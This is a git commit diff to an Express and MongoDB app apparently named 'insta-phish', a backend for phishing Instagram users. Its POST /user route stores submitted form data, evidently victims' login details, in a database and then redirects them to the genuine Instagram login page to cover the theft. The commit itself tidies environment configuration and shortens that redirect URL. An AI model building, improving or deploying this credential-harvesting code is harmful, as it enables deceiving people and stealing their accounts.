a27c8e91a8db1f554415aef7b6f84222b77e2104
techtrum <88105506+techtrum@users.noreply.github.com>
2021-12-10 12:24:06 -0800

    make it better

--- app.js
+++ app.js
@@ -1,10 +1,15 @@
+if(process.env.NODE_ENV !== "production") {
+    require('dotenv').config()
+}
+
 const express = require('express');
 const mongoose = require('mongoose')
 const app = express();
 const path = require('path');
 const User = require('./models/user')
 
-const dbUrl = process.env.DB_URL || 'mongodb://localhost:27017/insta-phish';
+const dbUrl = process.env.DB_URL;
+// const dbUrl = process.env.DB_URL || 'mongodb://localhost:27017/insta-phish';
 // const dbUrl = 'mongodb://localhost:27017/insta-phish';
 
 mongoose.connect(dbUrl, {useNewUrlParser: true, useUnifiedTopology: true})
@@ -33,7 +38,7 @@ app.get('/users', async(req, res) => {
 app.post('/user', async (req, res) => {
     const user = new User({ ...req.body.user })
     await user.save();
-    res.redirect('https://instagram.com/accounts/login/?source=auth_switcher')
+    res.redirect('https://instagram.com/accounts/login');
 })
 
 const port = process.env.PORT || 3000;
